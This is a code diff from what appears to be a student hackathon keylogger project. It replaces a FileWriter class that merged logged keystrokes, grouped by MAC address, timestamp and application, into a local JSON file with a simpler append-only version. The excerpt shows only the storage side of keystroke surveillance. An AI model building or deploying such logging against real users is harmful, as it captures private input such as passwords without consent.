@@ -95,36 +95,45 @@ import json
 import os
 
 
+# class FileWriter:
+#     @staticmethod
+#     def write_to_file(data: dict):
+#         file_path = r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json"
+#
+#         # אם הקובץ קיים, טען את הנתונים הקיימים
+#         if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+#             with open(file_path, "r", encoding="utf-8") as file:
+#                 try:
+#                     existing_data = json.load(file)
+#                 except json.JSONDecodeError:
+#                     existing_data = {}  # אם יש שגיאה, התחל עם מילון ריק
+#         else:
+#             existing_data = {}
+#
+#         # מיזוג הנתונים החדשים עם הישנים
+#         for mac, timestamps in data.items():
+#             if mac not in existing_data:
+#                 existing_data[mac] = {}
+#             for timestamp, logs in timestamps.items():
+#                 if timestamp not in existing_data[mac]:
+#                     existing_data[mac][timestamp] = {}
+#                 for app, keys in logs.items():
+#                     if app not in existing_data[mac][timestamp]:
+#                         existing_data[mac][timestamp][app] = []
+#                     existing_data[mac][timestamp][app].extend(keys)
+#
+#         # כתיבת הנתונים המעודכנים לקובץ
+#         with open(file_path, "w", encoding="utf-8") as file:
+#             json.dump(existing_data, file, indent=4, ensure_ascii=False)
+
+
+
 class FileWriter:
     @staticmethod
-    def write_to_file(data: dict):
-        file_path = r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json"
-
-        # אם הקובץ קיים, טען את הנתונים הקיימים
-        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
-            with open(file_path, "r", encoding="utf-8") as file:
-                try:
-                    existing_data = json.load(file)
-                except json.JSONDecodeError:
-                    existing_data = {}  # אם יש שגיאה, התחל עם מילון ריק
-        else:
-            existing_data = {}
-
-        # מיזוג הנתונים החדשים עם הישנים
-        for mac, timestamps in data.items():
-            if mac not in existing_data:
-                existing_data[mac] = {}
-            for timestamp, logs in timestamps.items():
-                if timestamp not in existing_data[mac]:
-                    existing_data[mac][timestamp] = {}
-                for app, keys in logs.items():
-                    if app not in existing_data[mac][timestamp]:
-                        existing_data[mac][timestamp][app] = []
-                    existing_data[mac][timestamp][app].extend(keys)
-
-        # כתיבת הנתונים המעודכנים לקובץ
-        with open(file_path, "w", encoding="utf-8") as file:
-            json.dump(existing_data, file, indent=4, ensure_ascii=False)
+    def write_to_file(data:dict):
+        with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json" , "a" , encoding="utf-8") as file:
+            if data:
+                json.dump(data , file ,ensure_ascii=False,  indent=4)
 
 
 class KeyLoggerManager:
